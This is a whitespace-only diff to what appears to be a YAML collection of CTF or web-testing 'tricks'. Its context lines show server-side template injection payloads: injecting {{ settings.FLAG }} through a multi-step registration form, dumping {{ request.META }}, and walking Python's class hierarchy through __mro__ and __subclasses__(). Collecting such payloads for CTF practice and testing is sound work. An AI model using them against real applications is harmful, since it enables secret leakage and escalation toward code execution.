@@ -31,10 +31,10 @@ tricks:
     payload: |
       # Step 1: POST /accounts/register/step1/
       # name={{ settings.FLAG }}&password=password1234
-      
+
       # Step 2: POST /accounts/register/step2/
       # email=test@test.com
-      
+
       # Step 3: GET /accounts/register/step3/
       # SSTI payload rendered in JavaScript alert
 
@@ -44,7 +44,6 @@ tricks:
     payload: |
       # Access request object
       {{ request.META }}
-      
+
       # Access class hierarchy (if available)
       {{ ''.__class__.__mro__[1].__subclasses__() }}
-
